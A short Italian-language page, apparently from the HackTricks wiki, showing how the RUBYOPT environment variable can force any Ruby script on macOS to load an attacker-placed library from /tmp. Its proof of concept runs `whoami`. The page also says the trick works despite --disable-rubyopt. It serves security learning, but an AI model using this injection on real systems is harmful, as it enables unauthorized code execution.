# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Utilizzando questa variabile di ambiente è possibile **aggiungere nuovi parametri** a **ruby** ogni volta che viene eseguito. Anche se il parametro **`-e`** non può essere utilizzato per specificare il codice ruby da eseguire, è possibile utilizzare i parametri **`-I`** e **`-r`** per aggiungere una nuova cartella al percorso delle librerie da caricare e poi **specificare una libreria da caricare**.

Crea la libreria **`inject.rb`** in **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Crea ovunque uno script ruby come:
```ruby:hello.rb
puts 'Hello, World!'
```
Poi fai caricare un arbitrario script ruby con:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Fatto divertente, funziona anche con il parametro **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
